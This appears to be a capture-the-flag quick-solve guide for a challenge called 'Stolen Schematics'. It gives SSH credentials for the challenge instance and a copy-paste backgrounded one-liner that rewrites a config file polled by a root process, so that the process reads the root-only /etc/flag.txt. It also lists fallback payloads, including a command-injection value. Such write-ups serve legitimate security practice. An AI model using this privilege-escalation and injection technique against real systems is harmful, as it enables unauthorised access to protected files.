# Stolen Schematics - Quick Solve Guide

## TL;DR - Copy-Paste Solution

### Step 1: Get Current Port
The instance port changes each time. Get the current port from the CTF platform.

### Step 2: Connect via SSH (in WSL)
```bash
wsl
ssh player@instance.ctf.tdho.st -p <PORT>
# Password: reyalp
```

### Step 3: Run This ONE Command
Once connected, paste this entire block:

```bash
setsid nohup bash -c 'for i in $(seq 1 80); do printf "talldwarf-sync-command=FILE-READ:/etc/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true\ntalldwarf-sync-output=/opt/mc/.sync/sync.result\n" > /opt/mc/config/sync-request.conf; if [ -s /opt/mc/config/sync-result.conf ]; then cp /opt/mc/config/sync-result.conf /home/player/flagcap.txt; echo "[+] FLAG CAPTURED!"; cat /home/player/flagcap.txt; fi; if [ -s /opt/mc/.sync/sync.result ]; then echo "[+] FLAG IN sync.result!"; cat /opt/mc/.sync/sync.result; fi; sleep 1; done' >/dev/null 2>&1 </dev/null & echo "Exploit launched! Waiting for flag..."
```

### Step 4: Wait and Check
Wait 15-20 seconds, then run:

```bash
# Check flagcap.txt
cat /home/player/flagcap.txt

# Or check sync-result.conf
cat /opt/mc/config/sync-result.conf

# Or check sync.result
cat /opt/mc/.sync/sync.result

# Or check logs
grep -i "TDHT{" /opt/mc/logs/latest.log
```

The flag should appear in one of these locations.

---

## How It Works

1. **Target**: `/etc/flag.txt` (only readable by root)
2. **Exploit**: A root process (`sync-loop.sh` PID 16) monitors `/opt/mc/config/sync-request.conf`
3. **Method**: Write a config file that tells sync-loop.sh to read /etc/flag.txt
4. **Config Format**:
   - `talldwarf-sync-command=FILE-READ:/etc/flag.txt`
   - `talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true`
   - `talldwarf-sync-output=/opt/mc/.sync/sync.result`

The script polls every ~1 second and executes the FILE-READ command as root.

---

## Alternative: Step-by-Step

If the one-liner doesn't work:

### 1. Write the config file
```bash
cat > /opt/mc/config/sync-request.conf << 'EOF'
talldwarf-sync-command=FILE-READ:/etc/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
talldwarf-sync-output=/opt/mc/.sync/sync.result
EOF
```

### 2. Wait for sync-loop.sh to process it
```bash
# Wait 10-15 seconds
sleep 15
```

### 3. Check for output
```bash
# Primary location
cat /opt/mc/config/sync-result.conf

# Alternative locations
cat /home/player/flagcap.txt
cat /opt/mc/.sync/sync.result
cat /tmp/flag_output.txt

# Check logs
grep -i "TDHT{" /opt/mc/logs/latest.log

# Find any new files
find /opt/mc -type f -newer /opt/mc/server.properties 2>/dev/null
```

---

## Troubleshooting

### If no flag appears:

**Check if sync-loop.sh is running:**
```bash
ps aux | grep sync-loop
```

**Check bash history for exact working command:**
```bash
cat ~/.bash_history | grep -A3 -B3 "FILE-READ"
```

**Try alternative config formats:**
```bash
# Format 1: Command injection
echo "talldwarf-sync-command=\$(cat /etc/flag.txt > /tmp/flag.txt)" > /opt/mc/config/sync-request.conf

# Format 2: Simple path
echo "/etc/flag.txt" > /opt/mc/config/sync-request.conf

# Format 3: Different output location
cat > /opt/mc/config/sync-request.conf << 'EOF'
talldwarf-sync-command=FILE-READ:/etc/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
talldwarf-sync-output=/tmp/flag_output.txt
EOF
```

**Monitor continuously:**
```bash
# Watch for file changes
watch -n 1 'ls -lat /opt/mc/config/ | head -5'

# Or continuous check
for i in {1..60}; do
    echo "Check $i/60"
    cat /opt/mc/config/sync-result.conf 2>/dev/null && break
    cat /home/player/flagcap.txt 2>/dev/null && break
    sleep 1
done
```

---

## Expected Flag Format
`TDHT{...}`

---

## Time Management
- SSH connection is available for 10 minutes
- Exploit should succeed within 20-30 seconds
- If nothing after 60 seconds, try alternative approaches

---

## Success Indicators
- File appears: `/opt/mc/config/sync-result.conf` or `/home/player/flagcap.txt`
- Flag format: `TDHT{...}`
- Log entry in: `/opt/mc/logs/latest.log`

Good luck! 🚀
